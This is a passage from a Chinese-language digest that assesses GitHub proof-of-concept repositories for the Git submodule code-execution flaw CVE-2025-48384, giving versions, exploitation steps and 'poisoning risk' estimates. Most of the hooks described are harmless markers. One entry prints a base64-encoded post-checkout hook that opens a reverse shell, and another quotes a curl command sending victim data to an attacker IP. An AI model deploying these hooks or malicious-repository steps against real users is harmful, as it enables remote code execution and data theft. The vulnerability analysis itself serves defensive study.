**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置时对回车符（CR）处理不当。攻击者可以构造包含恶意配置的 Git 仓库，其中子模块路径包含尾随 CR。当用户克隆该仓库并初始化子模块时，Git 会错误地将子模块检出到错误的位置。如果攻击者在错误的位置设置了一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，那么在检出后，该 hook 脚本就会被执行，从而导致任意代码执行。

**POC分析：**

提供的 POC 代码 `/tmp/569f31ff6b5166501e6218f8839f5620/post-checkout` 是一个 post-checkout hook 脚本。该脚本的作用是 ping `wtt0rkb926c0mj6tsxmzfr2xlorff53u.test-burp.huidoumeng.com`。这个行为本身用于验证漏洞是否被成功利用，攻击者可以通过监测 DNS 请求判断 hook 是否被执行。这个hook仅是验证，不能算恶意代码。

**有效性：**

根据搜索结果，该漏洞的PoC已经公开，并被标记为高危漏洞，利用代码结合漏洞描述，可以判断POC有效。

**投毒风险：**

提供的POC代码仅包含一个简单的ping命令，用于验证漏洞是否触发。它本身不包含任何恶意代码或后门，因此投毒风险较低，可以认为是0%。然而，实际攻击中，攻击者可能会将此 hook 替换为更具破坏性的代码。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置包括带有尾随回车符的子模块路径。
3.  攻击者在错误的位置创建一个指向子模块 hooks 目录的符号链接。
4.  攻击者在子模块中包含一个可执行的 post-checkout hook。
5.  攻击者诱使用户克隆该恶意仓库并初始化子模块。
6.  用户执行 `git clone --recurse-submodules` 或 `git submodule update --init --recursive`。
7.  Git将子模块检出到错误的位置，并执行 post-checkout hook，从而导致任意代码执行。

**项目地址:** [ECHO6789/CVE-2025-48384-submodule](https://github.com/ECHO6789/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #3

**来源**: [CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md](../2025/CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md)

## CVE-2025-48384-Git代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时的不一致性，具体来说，Git 在读取配置值时会移除尾部的回车符（CRLF），但在写入时，如果配置值以回车符结尾，则不会对其进行引用。这会导致在稍后读取配置时丢失回车符。

**漏洞利用方式：**

1.  **恶意仓库创建：** 攻击者创建一个恶意的 Git 仓库，其中包含一个`.gitmodules`文件，该文件定义了一个 submodule，其路径包含尾部回车符（CR）。例如：`path = submodule_path\r`。
2.  **符号链接：** 仓库中存在一个符号链接，指向修改后的 submodule 路径到`.git/hooks`目录。这样可以将看似无害的目录路径重定向到 Git 钩子目录。
3.  **恶意钩子：** 仓库中包含一个可执行的`post-checkout`钩子脚本，该脚本会在 checkout 操作后执行。
4.  **诱导用户：** 攻击者诱导受害者克隆（`git clone --recursive`）该恶意仓库。
5.  **代码执行：** 当受害者执行 `git clone --recursive` 时，Git 会尝试 checkout submodule 到错误路径。由于存在符号链接，实际checkout操作会将文件写入到 `.git/hooks` 目录。`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**有效性：**
提供的 Python 脚本 `cve_2025_48384_auto_print_scanner.py` 是一个扫描器，用于检测本地或远程 Git 仓库是否存在 CVE-2025-48384 漏洞的潜在利用。它会检查`.gitmodules`文件中是否存在包含尾部回车符或`..`的路径，查找指向`.git/hooks`的符号链接，并列出可执行的钩子脚本，并显示钩子脚本内容。虽然该脚本本身不能直接利用该漏洞，但可以帮助安全研究人员或用户识别潜在的恶意仓库。结合搜索结果，可以确认此漏洞存在可利用性。

**投毒风险：**
代码本身是一个扫描工具，旨在帮助用户识别潜在的漏洞。它没有发现任何主动植入后门或恶意代码的行为。因此，可以认为该代码本身不存在投毒风险。我评估投毒风险为0%。该脚本的目的是分析给定的 Git 仓库，而不是执行任何恶意操作，所以不应该存在投毒代码。

**项目地址:** [EdwardYeIntrix/CVE-2025-48384-Scanner](https://github.com/EdwardYeIntrix/CVE-2025-48384-Scanner)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #4

**来源**: [CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md](../2025/CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置解析漏洞导致任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并且执行`git submodule update --init --recursive`，用户需要交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于Git在解析配置文件时对换行符处理不当。具体来说，Git在读取配置值时会去除结尾的回车符和换行符（CRLF）。但在写入配置时，如果值以回车符结尾，则不会被正确引用，导致回车符丢失。利用该漏洞，攻击者可以精心构造包含恶意配置的Git仓库，当用户克隆并初始化子模块时，子模块路径中的回车符会被错误解析，导致子模块被检出到错误的位置。如果此时存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

提供的POC代码是一个简单的恶意post-checkout钩子脚本，其功能是在被执行时输出 "Malicious hook executed!"。该脚本本身并没有隐藏任何额外的投毒代码，它的目的是验证漏洞是否成功利用，而不是进行实际的恶意攻击。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的Git仓库。该配置文件中的子模块路径包含一个尾部的回车符。
2.  攻击者在仓库中创建一个符号链接，将错误解析后的子模块路径链接到`.git/modules/<submodule_name>/hooks`目录。
3.  攻击者在子模块中创建一个名为`post-checkout`的可执行钩子脚本。这个脚本包含攻击者想要执行的恶意代码。
4.  攻击者将仓库共享给受害者。
5.  受害者克隆该仓库并执行`git submodule update --init --recursive`命令。
6.  由于配置解析错误，子模块会被检出到错误的位置。
7.  符号链接会将对错误位置的访问重定向到子模块的钩子目录。
8.  `post-checkout`钩子脚本被执行，导致任意代码执行。

**项目地址:** [MarcoTondolo/cve-2025-48384-poc](https://github.com/MarcoTondolo/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #5

**来源**: [CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md](../2025/CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md)

## CVE-2025-48384-Git配置引号处理缺陷导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库，并初始化包含恶意配置的子模块，且子模块包含恶意的post-checkout hook。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置引号时存在缺陷。当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置项时，尾部带有CR的值不会被引用，导致CR在稍后读取配置时丢失。当初始化子模块时，如果子模块路径包含尾部CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本。

根据提供的POC代码，`/tmp/81a81d657749821214a4f9bba7b4c2c8/post`文件是一个简单的bash脚本，其功能是在`/tmp`目录下创建一个名为`CVE-2025-48384`的空文件。这个脚本本身不包含明显的恶意代码，但如果利用该漏洞，它可以被放置到`.git/hooks/post-checkout`中，在`git checkout`命令执行后自动执行。这使得攻击者可以控制受害者的系统。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。恶意配置包含一个包含尾部CR的子模块路径，该路径指向子模块的hooks目录。
2.  攻击者在该仓库中添加一个可执行的`post-checkout` hook脚本 (例如，提供的`post`脚本)到子模块的hooks目录中。
3.  攻击者诱导受害者克隆该恶意仓库并初始化子模块。
4.  由于Git的配置引号处理缺陷，子模块会被检出到错误的位置，符号链接会将该位置指向子模块的hooks目录。
5.  当受害者执行`git checkout`命令时，`post-checkout` hook脚本会被执行，攻击者从而实现任意代码执行。

**有效性：**
提供的POC代码是有效的，因为它展示了如何创建一个触发漏洞的`post-checkout` hook脚本。尽管脚本本身的功能很简单，但可以替换为任何恶意代码。

**投毒风险：**
该仓库中存在作者隐藏的投毒代码的风险较低，估计为10%。当前提供的脚本只是一个简单的测试脚本，用于验证漏洞的存在。但是，攻击者可能会在更复杂的仓库中隐藏更高级的恶意代码，使其更难被检测到。该风险评估基于提供的信息，实际风险可能因仓库的具体内容而有所不同。

**项目地址:** [admin-ping/CVE-2025-48384-RCE](https://github.com/admin-ping/CVE-2025-48384-RCE)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #6

**来源**: [CVE-2025-48384-airkewld_cve-2025-48384-submodule.md](../2025/CVE-2025-48384-airkewld_cve-2025-48384-submodule.md)

## CVE-2025-48384-Git配置注入与RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的Git仓库，且安装的Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于Git在处理配置文件时的不一致性，具体来说，是Git在读取和写入包含控制字符（如回车符CR）的配置值时的方式存在差异。当初始化子模块时，如果子模块路径包含尾随CR，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块钩子目录，并且子模块包含一个可执行的post-checkout钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**

根据提供的漏洞利用代码，`post-checkout` 文件包含 shell 命令 `echo "RCE"` 和 `touch /tmp/rce.txt`。 该 POC 通过在恶意 Git 仓库中设置恶意的 `post-checkout` 钩子，当存在漏洞的 Git 客户端克隆包含该恶意仓库并递归初始化子模块时，就会触发该钩子，从而在目标系统上执行任意命令，验证 POC 的有效性。

**投毒风险分析：**

在提供的POC代码中，`README.md` 文件主要用于描述仓库，本身不包含恶意代码。`post-checkout` 文件中包含 `echo` 和 `touch` 命令，用于验证 RCE 是否成功。虽然这两个命令本身没有危害，但如果攻击者在 `post-checkout` 脚本中添加更复杂的恶意代码（例如下载并执行其他恶意程序），则可能存在投毒风险。评估当前代码，投毒风险较低，初步估计为10%。

**利用方式：**

1.  攻击者创建一个包含恶意配置和子模块的Git仓库。
2.  恶意配置包含带有尾随CR的子模块路径，该路径被符号链接指向`.git/hooks`目录。
3.  子模块包含一个名为 `post-checkout` 的可执行钩子，其中包含要执行的恶意代码。
4.  攻击者诱使用户克隆并递归初始化该仓库（例如，使用`git clone --recursive`）。
5.  当 Git 处理子模块时，由于配置处理的缺陷，恶意 `post-checkout` 钩子会被触发，导致在用户计算机上执行任意代码。

**优先级依据：**

在漏洞分析过程中，搜索引擎结果提供了漏洞的概况、影响、利用情况等信息，有助于全面了解漏洞。漏洞利用代码提供了直接的利用方法，有助于验证漏洞的有效性并深入理解漏洞原理。漏洞库信息提供了漏洞的官方描述和修复方案，有助于确认漏洞的存在和修复方法。综合考虑这些信息来源，可以更准确地评估漏洞的风险和利用方式。

**项目地址:** [airkewld/cve-2025-48384-submodule](https://github.com/airkewld/cve-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #7

**来源**: [CVE-2025-48384-altm4n_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-altm4n_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，并使用受影响的Git版本

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置值时，会去除尾部的回车换行符 (CRLF)。当写入配置条目时，如果值包含尾部的回车符 (CR)，则不会进行引号转义，导致在后续读取配置时丢失回车符。如果初始化子模块时，子模块路径包含尾部的回车符，则读取到的路径会被修改，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
提供的 POC 代码 `touch /tmp/xxxxxxx` 会在 `/tmp` 目录下创建一个名为 `xxxxxxx` 的文件。结合漏洞描述，这个 POC 代码本身并不能直接证明漏洞的存在，而是在攻击链中扮演了 *post-checkout* 钩子的角色，用于验证恶意配置是否能被执行。根据页面[5]（`https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384`）的信息，此漏洞涉及到使用`git clone --recursive`克隆包含恶意子模块的仓库，可以触发RCE。

**投毒风险：**
给定的 POC 代码非常简单，仅创建一个文件，没有发现隐藏的恶意代码。因此，投毒风险为 0%。这个脚本的目的是验证 post-checkout 钩子是否被触发，而不是执行恶意操作。但是如果恶意攻击者控制了git仓库，可以植入任意的post-checkout脚本实现远端代码执行.

**利用方式：**
1.  **创建恶意仓库：** 攻击者创建一个包含恶意配置的 Git 仓库。这个恶意配置包括一个带有尾部回车符的子模块路径，以及一个指向子模块 hooks 目录的符号链接。
2.  **添加恶意钩子：** 在子模块的 hooks 目录中，攻击者添加一个可执行的 post-checkout 钩子。这个钩子可以执行任意代码。
3.  **诱导用户克隆：** 攻击者诱导用户使用受影响的 Git 版本克隆这个恶意仓库，使用 `git clone --recursive` 命令递归克隆子模块。
4.  **触发漏洞：** 当 Git 初始化子模块时，由于配置处理的缺陷，子模块会被检出到错误的位置，触发符号链接，最终导致恶意 post-checkout 钩子被执行，实现任意代码执行。

**总结：**
此漏洞利用依赖于特定的 Git 配置和用户交互（克隆恶意仓库），攻击复杂度较高，但一旦成功利用，危害极大，可能导致服务器被完全控制。

**项目地址:** [altm4n/CVE-2025-48384-sub](https://github.com/altm4n/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #8

**来源**: [CVE-2025-48384-altm4n_cve-2025-48384-hub.md](../2025/CVE-2025-48384-altm4n_cve-2025-48384-hub.md)

## CVE-2025-48384-Git配置注入/代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/代码执行

**影响应用:** Git

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库,并执行含有 post-checkout hook的submodule 初始化

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。该漏洞源于 Git 在处理配置文件时，没有正确处理尾部的回车符（CR）。攻击者可以利用这一点，在子模块路径中添加尾部回车符，导致 Git 将子模块检出到错误的位置。如果攻击者在该位置放置一个符号链接，指向子模块的钩子目录，并子模块包含一个可执行的 `post-checkout` 钩子，那么在检出后，该钩子脚本就会被执行，从而实现远程代码执行。

**有效性：** 根据漏洞描述和提供的漏洞利用代码（`post-checkout` 脚本），可以判断该 POC 代码有效。脚本尝试从攻击者的服务器下载并执行代码。

**投毒风险：** 提供的 `post-checkout` 脚本本身就是漏洞利用的一部分，目的是执行恶意代码。如果该脚本是从攻击者控制的仓库中获取的，那么它自然会执行攻击者想要执行的操作。因此，从这个角度来说，可以说利用本身具有“投毒”性质。更准确地说，这不是传统的供应链投毒，而是漏洞利用的核心部分。脚本的功能是将受害者机器的信息发送到攻击者的服务器（ `curl http://120.46.135.127:50009?z`），因此本身不包含额外的、隐藏的恶意行为。该脚本本身就是后门，旨在执行任意命令。

**利用方式：**
1.  攻击者创建一个包含恶意配置的 Git 仓库，该配置在子模块路径中包含尾部回车符。
2.  攻击者在恶意仓库中设置一个符号链接，将修改后的子模块路径指向 Git 钩子目录。
3.  攻击者在子模块中包含一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该恶意仓库并执行 `git submodule update --init --recursive` 命令。
5.  Git 将子模块检出到错误的位置，符号链接生效，`post-checkout` 钩子脚本被执行，从而实现远程代码执行。

**风险评估：** 此漏洞风险极高，因为攻击者可以通过诱导用户克隆恶意仓库，在用户机器上执行任意代码。

**项目地址:** [altm4n/cve-2025-48384-hub](https://github.com/altm4n/cve-2025-48384-hub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #9

**来源**: [CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md](../2025/CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md)

## CVE-2025-48384 - Git Config 注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库，并初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 对配置项中回车符（CR）处理不当。具体来说，当 Git 读取配置值时，会去除尾部的 CRLF。但当写入配置项时，如果值包含尾部 CR，则不会被引用，导致 CR 在后续读取时丢失。这个漏洞可以被利用于子模块初始化过程中。如果子模块的路径包含尾部 CR，修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，那么在检出后，该脚本可能会被意外执行，从而导致任意代码执行。

**POC 分析：**

提供的 POC 包含以下文件：

*   `/tmp/c0992c92d79d1fe84e0bde5daf2c172b/README.md`：一个普通的 README 文件，可能用于描述 PoC 的用途。
*   `/tmp/c0992c92d79d1fe84e0bde5daf2c172b/post-checkout`：一个 bash 脚本，当子模块检出后会被执行。脚本的功能很简单，就是创建一个 `/tmp/fishsucks` 文件。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件中的子模块路径包含尾部 CR。
2.  攻击者在该仓库中创建一个子模块，并在该子模块的 `.git/hooks` 目录下放置一个名为 `post-checkout` 的可执行脚本（如提供的POC）。
3.  攻击者创建一个符号链接，将包含尾部 CR 的子模块路径指向该子模块的 `.git/hooks` 目录。
4.  受害者克隆该仓库，并执行 `git submodule init` 和 `git submodule update` 命令。
5.  由于 Git 对尾部 CR 的处理不当，子模块会被检出到错误的位置，并且 `post-checkout` 脚本会被执行，从而导致任意代码执行。

**有效性：**

根据漏洞描述和 POC 代码，该 POC 是有效的。它可以利用 Git 的配置解析漏洞，在受害者机器上执行任意代码。

**投毒风险：**

该POC的目的是创建一个`/tmp/fishsucks`文件,根据POC内容来看，此代码的目的是演示该漏洞，没有发现隐藏的恶意代码，因此投毒风险较低，可以认为是 0%。

**项目地址:** [beishanxueyuan/CVE-2025-48384](https://github.com/beishanxueyuan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #10

**来源**: [CVE-2025-48384-bummie_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-bummie_CVE-2025-48384-submodule.md)

## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符(
)处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #11

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户执行递归克隆包含恶意.gitmodules文件的不受信任的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造恶意的.gitmodules文件和post-checkout钩子执行任意代码。该漏洞源于Git在处理带有回车符的配置值时存在差异，导致 submodule 被检出到错误的位置。如果攻击者在 submodule hooks 目录中放置一个符号链接，指向一个包含可执行的 post-checkout 钩子的子模块，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 post-checkout 钩子，它会在 `/tmp/exploited` 目录下创建一个文件。如果目标系统存在此漏洞并且成功利用，那么这个文件将被创建，表明漏洞利用成功。因此，该POC代码对于验证漏洞的存在是有效的。

**投毒风险：**

提供的POC代码本身非常简单，只是创建了一个文件。没有迹象表明代码中存在隐藏的恶意功能，因此投毒风险为0%。但是，这并不意味着包含此POC的仓库没有投毒风险。攻击者可能会在仓库的其他部分添加恶意代码，或者修改其他钩子来执行恶意操作。

**利用方式：**

漏洞利用方式如下：

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库。该文件包含带有尾随回车符的submodule路径。
2.  攻击者在submodule hooks目录中创建一个符号链接，将更改后的路径指向包含恶意 post-checkout 钩子的子模块。
3.  攻击者诱使用户递归克隆该仓库 (`git clone --recursive <repository_url>`)。
4.  当 Git 初始化 submodule 时，由于回车符处理不一致，submodule 会被检出到错误的位置。
5.  由于符号链接的存在，恶意的 post-checkout 钩子会被执行，导致任意代码执行。

总而言之，这是一个客户端漏洞，需要用户执行特定的操作才能被利用。攻击者需要诱使用户克隆包含恶意配置的仓库，并且用户需要使用受影响的 Git 版本。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC-Part2](https://github.com/butyraldehyde/CVE-2025-48384-PoC-Part2)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #12

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md)

## CVE-2025-48384-Git配置注入导致RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/RCE

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要clone包含恶意配置的git仓库（特别是包含submodule的仓库），并递归更新submodule。需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞是由于 Git 在处理包含回车符（CR）的配置值时存在不一致的行为导致的。具体来说，Git在读取配置值时会移除尾部的CRLF，但在写入配置时，如果值以CR结尾，则不会进行引号包裹，这会导致在后续读取时CR被截断。利用此漏洞，攻击者可以通过构造包含恶意配置的 `.gitmodules` 文件，当用户递归克隆包含 submodule 的仓库时，submodule会被检出到错误的位置。如果错误的位置存在一个指向 submodule 钩子目录的符号链接，并且 submodule 中包含一个可执行的 post-checkout 钩子，那么该钩子脚本可能在检出后被意外执行，从而导致远程代码执行 (RCE)。

**有效性：** 提供的 POC 代码 `/tmp/81eebc7f5ed9915ea7ef755075778acd/README.md` 看起来只是一个 README 文件，用于描述该漏洞。单凭这个文件本身无法直接触发漏洞，但可以作为漏洞利用的一部分，例如提供一个包含恶意`.gitmodules`文件的仓库。因此，提供的 PoC 代码本身无效，需要配合其他恶意文件才能完成漏洞利用。

**投毒风险：** 虽然提供的 PoC 仅仅是一个 README 文件，没有任何可疑代码。但是考虑到攻击者可能会在整个恶意Git仓库的其他位置，比如 `.gitmodules` 文件，或者 submodule 的 post-checkout 钩子中隐藏恶意代码。 考虑到这个漏洞需要恶意git仓库才能触发，因此存在一定的投毒风险，风险占比10%。

**利用方式：**

1.  **创建恶意 Git 仓库：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
